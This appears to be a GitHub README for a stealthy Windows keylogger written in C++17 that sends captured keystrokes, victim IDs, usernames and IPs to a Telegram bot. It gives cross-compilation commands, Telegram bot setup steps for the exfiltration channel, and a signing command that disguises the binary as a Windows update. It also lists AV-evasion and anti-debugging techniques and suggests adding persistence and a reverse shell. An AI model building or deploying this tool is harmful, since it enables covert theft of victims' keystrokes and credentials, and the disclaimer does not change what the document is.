🧩 Windows Keylogger with Telegram Exfiltration (WinHTTP, C++17)

⚠️ For educational and security research purposes only.
Unauthorized use against devices you do not own is illegal and strictly prohibited.

------------------------------------------------------------

📌 Overview

This project is a stealth-focused Windows keylogger written in C++17, using native Windows API and WinHTTP for secure exfiltration of data to Telegram.

Core capabilities:
- Capture keystrokes using WH_KEYBOARD_LL
- Exfiltrate logs to a private Telegram bot
- Avoid AV detection using manual API resolution (LoadLibraryA + GetProcAddress)
- Generate a unique victim ID with CoCreateGuid
- Hide console window and run in the background
- Include basic anti-debugging via IsDebuggerPresent

------------------------------------------------------------

⚙️ Features

- No static imports — APIs resolved dynamically
- Uses native WinHTTP instead of third-party libraries
- Detects debugger presence and aborts
- Multithreaded log sender
- Infinite message loop to keep process alive
- Silent cleanup and safe exit

------------------------------------------------------------

🏗️ Compilation (on Linux → Windows)

🔧 Requirements

Install mingw-w64 on Debian/Ubuntu/Kali:

sudo apt update
sudo apt install g++-mingw-w64-x86-64

🧱 Compile

x86_64-w64-mingw32-g++ -std=c++17 update.cpp -o update.exe -static-libgcc -static-libstdc++ -lwinhttp -luser32 -lrpcrt4 -lole32 -ladvapi32

Sign the exe:

osslsigncode sign \
  -certs mycert.pem \
  -key mykey.pem \
  -n "WindowsUpdate" \
  -i http://microsoft.com \
  -t http://timestamp.sectigo.com \
  -in update.exe \
  -out updateasus.exe

------------------------------------------------------------

🔐 Telegram Bot Setup

To use this keylogger with Telegram, modify the following values in main.cpp:

const std::string BOT_TOKEN_PLAINTEXT = "REPLACE_WITH_YOUR_TOKEN";
const std::string CHAT_ID_PLAINTEXT = "REPLACE_WITH_YOUR_CHAT_ID";

Steps:
- Create a bot with @BotFather
- Start a chat with your bot
- Use https://api.telegram.org/bot<YourBotToken>/getUpdates to get your chat_id
- Replace placeholders and recompile

------------------------------------------------------------

🧪 Runtime Behavior

- Sends an initial "target online" message
- Sends victim ID, username, and IP
- Periodically exfiltrates keystrokes
- Hides the console and runs silently
- Auto-terminates if a debugger is present

------------------------------------------------------------

⚠️ Legal Disclaimer

This software is for:
- Malware analysis research
- Security training and education
- Red team simulations on authorized systems

Use it only on systems you own or have explicit permission to test.
The developer assumes no responsibility for misuse.

------------------------------------------------------------

Additional Notes

- Does not use WinINet, Boost, or cURL
- Pure C++17 implementation using raw Windows API
- Easily extendable with:
  - Screenshot capturing
  - Persistence mechanisms (e.g., Registry Run keys)
  - Reverse shell or remote command execution

🙋 Contact & Support

Feel free to open an issue or discussion on GitHub if you have questions or would like to collaborate for research or educational use.
